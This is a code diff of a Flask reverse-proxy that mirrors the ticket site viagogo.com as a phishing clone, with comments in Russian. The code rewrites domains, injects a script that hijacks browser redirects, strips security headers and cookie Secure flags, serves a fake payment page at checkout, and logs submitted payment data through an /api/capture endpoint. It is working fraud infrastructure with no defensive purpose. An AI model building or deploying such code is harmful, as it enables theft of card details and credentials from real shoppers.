@@ -1,10 +1,9 @@
-from flask import Flask, request, Response, render_template
+from flask import Flask, request, Response, render_template, redirect as flask_redirect
 import requests
 import re
-from urllib.parse import urljoin
-import threading
-import time
 import os
+import json
+import datetime
 
 app = Flask(__name__)
 
@@ -16,187 +15,163 @@ EXTERNAL_HOST = os.environ.get("RENDER_EXTERNAL_HOSTNAME", "localhost")
 EXCLUDED_REQUEST_HEADERS = [
     'host', 'origin', 'referer', 'x-forwarded-for',
     'x-forwarded-proto', 'x-forwarded-host', 'x-forwarded-port',
-    'x-real-ip', 'cf-connecting-ip', 'true-client-ip'
+    'x-real-ip', 'cf-connecting-ip', 'true-client-ip',
+    'accept-encoding'
 ]
 
 EXCLUDED_RESPONSE_HEADERS = [
     'content-encoding', 'content-length', 'transfer-encoding',
     'connection', 'strict-transport-security',
     'content-security-policy', 'content-security-policy-report-only',
-    'x-content-type-options', 'x-frame-options',
-    'x-xss-protection', 'set-cookie'
-]
-
-STATIC_EXTENSIONS = (
-    '.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp', '.ico',
-    '.css', '.js', '.woff', '.woff2', '.ttf', '.eot',
-    '.mp4', '.webm', '.mp3', '.map', '.json'
-)
-
-BLOCK_PATHS = [
-    '/api/capture',
-    '/static/',
+    'x-frame-options', 'x-xss-protection',
+    'set-cookie'
 ]
 
 session = requests.Session()
 session.headers.update({
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
-                  '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Accept-Language': 'en-US,en;q=0.9',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
-              'image/webp,image/apng,*/*;q=0.8',
-    'Cache-Control': 'no-cache',
-    'Pragma': 'no-cache'
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
 })
 
-session_adapter = requests.adapters.HTTPAdapter(
-    pool_connections=10,
-    pool_maxsize=10,
-    max_retries=2,
-    pool_block=False
-)
-session.mount('https://', session_adapter)
-
-def should_rewrite_body(content_type):
-    if not content_type:
-        return False
-    ct = content_type.lower()
-    return any(t in ct for t in ['text/html', 'text/css', 'javascript', 'application/json', 'text/plain'])
-
-def rewrite_html(content):
-    content_str = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
-
-    replacements = [
-        ('https://www.viagogo.com', 'https://' + EXTERNAL_HOST),
-        ('https://viagogo.com', 'https://' + EXTERNAL_HOST),
-        ('http://www.viagogo.com', 'https://' + EXTERNAL_HOST),
-        ('http://viagogo.com', 'https://' + EXTERNAL_HOST),
-        ('//www.viagogo.com', '//' + EXTERNAL_HOST),
+def replace_all_domains(text):
+    if not text:
+        return text
+    patterns = [
+        (r'https?://www\.viagogo\.com', 'https://' + EXTERNAL_HOST),
+        (r'https?://viagogo\.com', 'https://' + EXTERNAL_HOST),
+        (r'https?://api\.viagogo\.com', 'https://' + EXTERNAL_HOST),
+        (r'https?://myaccount\.viagogo\.com', 'https://' + EXTERNAL_HOST),
+        (r'https?://checkout\.viagogo\.com', 'https://' + EXTERNAL_HOST),
+        (r'//www\.viagogo\.com', '//' + EXTERNAL_HOST),
+        (r'//viagogo\.com', '//' + EXTERNAL_HOST),
     ]
+    for pattern, replacement in patterns:
+        text = re.sub(pattern, replacement, text)
+    return text
 
-    for old, new in replacements:
-        content_str = content_str.replace(old, new)
+def inject_antiredirect_script():
+    return f"""
+<script>
+(function() {{
+    var REAL_HOST = "{EXTERNAL_HOST}";
+    var PROTO = "https:";
 
-    content_str = re.sub(
-        r'(https?://)?api\.viagogo\.com',
-        'https://' + EXTERNAL_HOST,
-        content_str
-    )
-    content_str = re.sub(
-        r'(https?://)?myaccount\.viagogo\.com',
-        'https://' + EXTERNAL_HOST,
-        content_str
-    )
-    content_str = re.sub(
-        r'(https?://)?checkout\.viagogo\.com',
-        'https://' + EXTERNAL_HOST,
-        content_str
-    )
+    // БЛОКИРОВКА ВСЕХ РЕДИРЕКТОВ
+    var blockRedirect = function(url) {{
+        if (typeof url === 'string') {{
+            if (url.indexOf('viagogo.com') !== -1 && url.indexOf(REAL_HOST) === -1) {{
+                return url.replace(/https?:\\/\\/(www\\.)?viagogo\\.com/g, PROTO + '//' + REAL_HOST)
+                           .replace(/https?:\\/\\/api\\.viagogo\\.com/g, PROTO + '//' + REAL_HOST)
+                           .replace(/https?:\\/\\/myaccount\\.viagogo\\.com/g, PROTO + '//' + REAL_HOST)
+                           .replace(/https?:\\/\\/checkout\\.viagogo\\.com/g, PROTO + '//' + REAL_HOST);
+            }}
+        }}
+        return url;
+    }};
 
-    content_str = re.sub(
-        r'window\.location\.href\s*=\s*["\']https?://(?:www\.)?viagogo\.com',
-        f'window.location.href = "https://{EXTERNAL_HOST}"',
-        content_str
-    )
-    content_str = re.sub(
-        r'window\.location\s*=\s*["\']https?://(?:www\.)?viagogo\.com',
-        f'window.location = "https://{EXTERNAL_HOST}"',
-        content_str
-    )
-    content_str = re.sub(
-        r'location\.href\s*=\s*["\']https?://(?:www\.)?viagogo\.com',
-        f'location.href = "https://{EXTERNAL_HOST}"',
-        content_str
-    )
-    content_str = re.sub(
-        r'document\.location\s*=\s*["\']https?://(?:www\.)?viagogo\.com',
-        f'document.location = "https://{EXTERNAL_HOST}"',
-        content_str
-    )
-    content_str = re.sub(
-        r'location\.replace\(["\']https?://(?:www\.)?viagogo\.com',
-        f'location.replace("https://{EXTERNAL_HOST}"',
-        content_str
-    )
-    content_str = re.sub(
-        r'location\.assign\(["\']https?://(?:www\.)?viagogo\.com',
-        f'location.assign("https://{EXTERNAL_HOST}"',
-        content_str
-    )
+    // Перехват window.location
+    var _location = window.location;
+    Object.defineProperty(window, 'location', {{
+        get: function() {{ return _location; }},
+        set: function(val) {{
+            if (typeof val === 'string') {{
+                val = blockRedirect(val);
+            }}
+            _location.href = val;
+        }}
+    }});
 
-    inject_script = '''
-    <script>
-    (function() {
-        var originalLocation = window.location;
-        var fakeOrigin = "https://''' + EXTERNAL_HOST + '''";
-        var handler = {
-            get: function(target, prop) {
-                if (prop === 'origin') return fakeOrigin;
-                if (prop === 'host') return "''' + EXTERNAL_HOST + '''";
-                if (prop === 'hostname') return "''' + EXTERNAL_HOST + '''";
-                if (prop === 'protocol') return "https:";
-                if (prop === 'href') return fakeOrigin + target.pathname + target.search + target.hash;
-                return Reflect.get(target, prop);
-            },
-            set: function(target, prop, value) {
-                if (prop === 'href' || prop === 'assign' || prop === 'replace') {
-                    if (typeof value === 'string' && value.indexOf('viagogo.com') !== -1) {
-                        value = value.replace(/https?:\\/\\/(www\\.)?viagogo\\.com/g, fakeOrigin);
-                    }
-                    return Reflect.set(target, prop, value);
-                }
-                return Reflect.set(target, prop, value);
-            }
-        };
-        window.location = new Proxy(originalLocation, handler);
-    })();
-    </script>
-    '''
+    // Перехват location.href
+    var _hrefDescriptor = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
+    Object.defineProperty(Location.prototype, 'href', {{
+        get: function() {{ return _hrefDescriptor.get.call(this); }},
+        set: function(val) {{
+            val = blockRedirect(val);
+            _hrefDescriptor.set.call(this, val);
+        }}
+    }});
 
-    head_close_pos = content_str.find('</head>')
-    if head_close_pos != -1:
-        content_str = content_str[:head_close_pos] + inject_script + content_str[head_close_pos:]
+    // Перехват location.replace
+    var _replace = Location.prototype.replace;
+    Location.prototype.replace = function(url) {{
+        url = blockRedirect(url);
+        return _replace.call(this, url);
+    }};
 
-    return content_str.encode('utf-8')
+    // Перехват location.assign
+    var _assign = Location.prototype.assign;
+    Location.prototype.assign = function(url) {{
+        url = blockRedirect(url);
+        return _assign.call(this, url);
+    }};
 
-def rewrite_css(content):
-    content_str = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
-    content_str = re.sub(
-        r'url\(["\']?(https?://)?(?:www\.)?viagogo\.com',
-        f'url(https://{EXTERNAL_HOST}',
-        content_str
-    )
-    content_str = re.sub(
-        r'url\(["\']?(https?://)?(?:www\.)?viagogo\.com',
-        f'url(https://{EXTERNAL_HOST}',
-        content_str
-    )
-    return content_str.encode('utf-8')
+    // Перехват history.pushState
+    var _pushState = history.pushState;
+    history.pushState = function(state, title, url) {{
+        url = blockRedirect(url);
+        return _pushState.call(this, state, title, url);
+    }};
 
-def rewrite_js(content):
-    content_str = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
-    content_str = content_str.replace('https://www.viagogo.com', 'https://' + EXTERNAL_HOST)
-    content_str = content_str.replace('https://viagogo.com', 'https://' + EXTERNAL_HOST)
-    content_str = content_str.replace('http://www.viagogo.com', 'https://' + EXTERNAL_HOST)
-    content_str = content_str.replace('http://viagogo.com', 'https://' + EXTERNAL_HOST)
-    content_str = content_str.replace('//www.viagogo.com', '//' + EXTERNAL_HOST)
-    content_str = re.sub(
-        r'["\'](/api/[^"\']*)["\']',
-        rf'"https://{EXTERNAL_HOST}\1"',
-        content_str
-    )
-    return content_str.encode('utf-8')
+    // Перехват history.replaceState
+    var _replaceState = history.replaceState;
+    history.replaceState = function(state, title, url) {{
+        url = blockRedirect(url);
+        return _replaceState.call(this, state, title, url);
+    }};
 
-def rewrite_json(content):
-    content_str = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
-    content_str = content_str.replace('https://www.viagogo.com', 'https://' + EXTERNAL_HOST)
-    content_str = content_str.replace('https://viagogo.com', 'https://' + EXTERNAL_HOST)
-    return content_str.encode('utf-8')
+    // Перехват fetch
+    var _fetch = window.fetch;
+    window.fetch = function(url, options) {{
+        if (typeof url === 'string') {{
+            url = blockRedirect(url);
+        }} else if (url instanceof Request) {{
+            var newUrl = blockRedirect(url.url);
+            url = new Request(newUrl, url);
+        }}
+        return _fetch.call(this, url, options);
+    }};
+
+    // Перехват XMLHttpRequest
+    var _open = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {{
+        if (typeof url === 'string') {{
+            url = blockRedirect(url);
+        }}
+        return _open.call(this, method, url, true);
+    }};
+
+    // Перехват window.open
+    var _windowOpen = window.open;
+    window.open = function(url) {{
+        if (typeof url === 'string') {{
+            url = blockRedirect(url);
+        }}
+        return _windowOpen.call(window, url);
+    }};
+
+    // Блокировка meta refresh
+    var observer = new MutationObserver(function(mutations) {{
+        mutations.forEach(function(mutation) {{
+            mutation.addedNodes.forEach(function(node) {{
+                if (node.tagName === 'META' && node.httpEquiv === 'refresh') {{
+                    var content = node.getAttribute('content');
+                    if (content && content.indexOf('viagogo.com') !== -1) {{
+                        node.setAttribute('content', blockRedirect(content));
+                    }}
+                }}
+            }});
+        }});
+    }});
+    observer.observe(document.documentElement, {{ childList: true, subtree: true }});
+
+    console.log('[AntiRedirect] Active - all redirects to viagogo.com blocked');
+}})();
+</script>
+"""
 
 @app.route('/api/capture', methods=['POST'])
 def capture_payment():
-    import json
-    import datetime
     data = request.get_json(force=True, silent=True)
     timestamp = datetime.datetime.utcnow().isoformat()
     log_entry = {
@@ -206,36 +181,28 @@ def capture_payment():
         'data': data
     }
     print(f"[CAPTURE] {json.dumps(log_entry)}")
-    try:
-        with open('/tmp/captured_payments.log', 'a') as f:
-            f.write(json.dumps(log_entry) + '\n')
-    except Exception as e:
-        print(f"[ERROR] Failed to write log: {e}")
+    sys.stdout.flush()
     return {'status': 'ok', 'message': 'Payment processing'}, 200
-
-@app.route('/static/fake_payment.html')
-def serve_fake_payment():
-    return render_template('fake_payment.html', host=EXTERNAL_HOST)
 
 @app.route('/health')
 def health():
     return {'status': 'ok', 'host': EXTERNAL_HOST}, 200
 
-@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
-def proxy(path):
-    if path.startswith('static/') or path == 'api/capture':
-        if path == 'api/capture' and request.method == 'POST':
-            return capture_payment()
-        return app.send_static_file(path) if path.startswith('static/') else ('', 404)
+@app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
+def proxy(path=''):
+    # Логирование каждого запроса для отладки
+    print(f"[REQUEST] {request.method} {request.url} -> {path}")
 
-    if CHECKOUT_TRIGGER in request.path or path.endswith('/checkout/payment') or '/checkout/payment?' in request.path:
+    # Если это запрос к фейковой платёжной странице
+    if CHECKOUT_TRIGGER in request.path or path.endswith('/checkout/payment'):
+        print(f"[TRIGGER] Checkout detected, serving fake payment page")
         return render_template('fake_payment.html', host=EXTERNAL_HOST)
 
     target_url = f"{TARGET_SCHEME}://{TARGET_DOMAIN}/{path}"
     if request.query_string:
-        query_str = request.query_string.decode('utf-8') if isinstance(request.query_string, bytes) else request.query_string
-        target_url += f"?{query_str}"
+        qs = request.query_string.decode('utf-8') if isinstance(request.query_string, bytes) else request.query_string
+        target_url += f"?{qs}"
 
     headers = {}
     for key, value in request.headers.items():
@@ -245,10 +212,6 @@ def proxy(path):
     headers['Host'] = TARGET_DOMAIN
     headers['Origin'] = f'{TARGET_SCHEME}://{TARGET_DOMAIN}'
     headers['Referer'] = f'{TARGET_SCHEME}://{TARGET_DOMAIN}/'
-    headers['Accept-Encoding'] = 'gzip, deflate'
-
-    if 'cookie' in headers:
-        headers['cookie'] = re.sub(r'domain=\.?viagogo\.com', '', headers['cookie'])
 
     try:
         resp = session.request(
@@ -256,46 +219,72 @@ def proxy(path):
             url=target_url,
             headers=headers,
             data=request.get_data(),
-            cookies=request.cookies,
-            allow_redirects=False,
+            allow_redirects=False,  # КРИТИЧНО: не следовать редиректам
             timeout=25,
             verify=True
         )
-    except requests.exceptions.Timeout:
-        return render_template('fake_payment.html', host=EXTERNAL_HOST), 200
-    except requests.exceptions.ConnectionError as e:
-        return f'Proxy connection error: {str(e)[:200]}', 502
     except Exception as e:
-        return f'Proxy error: {str(e)[:200]}', 502
+        print(f"[ERROR] Proxy request failed: {e}")
+        return f'Proxy error', 502
 
+    print(f"[RESPONSE] Status: {resp.status_code}, Location: {resp.headers.get('Location', 'none')}")
+
+    # Обработка HTTP-редиректов (30x)
     if resp.status_code in (301, 302, 303, 307, 308):
         location = resp.headers.get('Location', '')
         if location:
-            location = location.replace('https://www.viagogo.com', 'https://' + EXTERNAL_HOST)
-            location = location.replace('https://viagogo.com', 'https://' + EXTERNAL_HOST)
-            location = location.replace('http://www.viagogo.com', 'https://' + EXTERNAL_HOST)
-            location = location.replace('http://viagogo.com', 'https://' + EXTERNAL_HOST)
-        from flask import redirect as flask_redirect
-        response = flask_redirect(location, code=resp.status_code)
+            original_location = location
+            location = replace_all_domains(location)
+            # Если Location указывает на наш домен, возвращаем редирект
+            if EXTERNAL_HOST in location:
+                print(f"[REDIRECT] Modified: {original_location} -> {location}")
+                response = flask_redirect(location, code=resp.status_code)
+            else:
+                # Если Location всё ещё внешний, заменяем принудительно
+                location = f"https://{EXTERNAL_HOST}/"
+                print(f"[REDIRECT] Forced to home: {original_location} -> {location}")
+                response = flask_redirect(location, code=302)
+        else:
+            location = f"https://{EXTERNAL_HOST}/"
+            response = flask_redirect(location, code=302)
         return response
 
     content_type = resp.headers.get('Content-Type', '')
     content = resp.content
 
-    if should_rewrite_body(content_type):
-        if 'text/html' in content_type:
-            content = rewrite_html(content)
-        elif 'text/css' in content_type:
-            content = rewrite_css(content)
-        elif 'javascript' in content_type:
-            content = rewrite_js(content)
-        elif 'application/json' in content_type:
-            content = rewrite_json(content)
-        else:
-            content = content.replace(
-                b'https://www.viagogo.com',
-                ('https://' + EXTERNAL_HOST).encode('utf-8')
-            )
+    # Модификация содержимого
+    if content and content_type:
+        ct_lower = content_type.lower()
+        try:
+            text_content = content.decode('utf-8', errors='replace')
+
+            # Замена доменов в любом текстовом контенте
+            text_content = replace_all_domains(text_content)
+
+            # Инъекция антиредирект-скрипта в HTML
+            if 'text/html' in ct_lower:
+                head_close = text_content.find('</head>')
+                if head_close != -1:
+                    text_content = text_content[:head_close] + inject_antiredirect_script() + text_content[head_close:]
+
+            # Дополнительная обработка JavaScript
+            if 'javascript' in ct_lower or 'text/html' in ct_lower:
+                # Замена присвоений location в JS
+                text_content = re.sub(
+                    r'(window\.location|location|document\.location)\s*=\s*["\']([^"\']*viagogo\.com[^"\']*)["\']',
+                    rf'\1 = "https://{EXTERNAL_HOST}/"',
+                    text_content
+                )
+                text_content = re.sub(
+                    r'(window\.location\.href|location\.href|document\.location\.href)\s*=\s*["\']([^"\']*viagogo\.com[^"\']*)["\']',
+                    rf'\1 = "https://{EXTERNAL_HOST}/"',
+                    text_content
+                )
+
+            content = text_content.encode('utf-8')
+        except Exception as e:
+            print(f"[WARNING] Content rewrite error: {e}")
+            pass
 
     proxy_response = Response(content, status=resp.status_code)
 
@@ -304,34 +293,23 @@ def proxy(path):
         if key_lower in EXCLUDED_RESPONSE_HEADERS:
             continue
         if key_lower == 'location':
-            value = value.replace('https://www.viagogo.com', 'https://' + EXTERNAL_HOST)
-            value = value.replace('https://viagogo.com', 'https://' + EXTERNAL_HOST)
+            value = replace_all_domains(value)
+            if 'viagogo.com' in value and EXTERNAL_HOST not in value:
+                value = f"https://{EXTERNAL_HOST}/"
         if key_lower == 'set-cookie':
             value = re.sub(r'Domain=\.?viagogo\.com', f'Domain={EXTERNAL_HOST}', value, flags=re.IGNORECASE)
             value = re.sub(r';\s*Secure', '', value, flags=re.IGNORECASE)
         proxy_response.headers[key] = value
 
-    proxy_response.headers['X-Proxy'] = 'viagogo-mirror'
+    # Удаляем опасные заголовки безопасности
+    for bad_header in ['Content-Security-Policy', 'X-Frame-Options', 'Strict-Transport-Security']:
+        if bad_header in proxy_response.headers:
+            del proxy_response.headers[bad_header]
+
     return proxy_response
 
-@app.errorhandler(404)
-def not_found(e):
-    return render_template('fake_payment.html', host=EXTERNAL_HOST), 200
+@app.route('/')
+def index():
+    return proxy('')
 
-@app.errorhandler(500)
-def server_error(e):
-    return render_template('fake_payment.html', host=EXTERNAL_HOST), 200
-
-def keep_alive():
-    while True:
-        time.sleep(600)
-        try:
-            requests.get(f'https://{EXTERNAL_HOST}/health', timeout=10)
-        except:
-            pass
-
-if __name__ == '__main__':
-    if os.environ.get('RENDER') != 'true':
-        threading.Thread(target=keep_alive, daemon=True).start()
-    port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+import sys
